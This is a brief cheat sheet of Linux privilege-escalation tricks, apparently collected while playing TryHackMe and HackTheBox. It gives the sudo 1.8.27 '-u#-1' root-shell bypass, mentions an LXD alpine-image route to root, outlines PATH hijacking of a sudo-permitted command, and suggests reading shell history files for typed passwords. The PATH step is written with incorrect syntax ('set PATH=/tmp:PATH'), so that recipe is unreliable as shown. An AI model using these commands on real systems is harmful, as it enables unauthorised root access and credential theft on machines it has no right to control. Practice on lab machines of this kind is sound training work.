# Privesc

A quick cheat sheet on privesc I have found while playing thm/htb etc.

## Sudo version 1.8.27

```sudo -u#-1 /bin/bash```

## LXD

Upload alpine image. Run script in exploits folder to get root

## Path hijacking

```
cd /tmp <any writeable directory

echo '/bin/bash' > <command with sudo priv>
set PATH=/tmp:PATH

run command
```
## Check History

Check if user typed passwords etc to terminal
```cat ~/.*history | less ```
